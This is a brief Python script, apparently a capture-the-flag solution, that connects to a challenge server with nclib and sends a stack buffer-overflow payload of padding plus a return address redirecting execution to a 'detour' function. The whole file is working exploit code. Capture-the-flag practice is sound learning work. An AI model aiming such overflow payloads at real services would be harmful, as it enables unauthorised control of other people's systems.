from nclib import netcat

# detour = 0x00401156
# buffer_length = 20
# AAAAAAAAAAAAAAAAAAAAABCD


nc = netcat.Netcat(('challenges.unitedctf.ca', 17001))
nc.recv()
payload = b'A'*20 + b'AAAA'*5 + b'\x5a\x11\x40' + b'\n'
nc.send(payload)
nc.recv()
print(nc.recv().decode())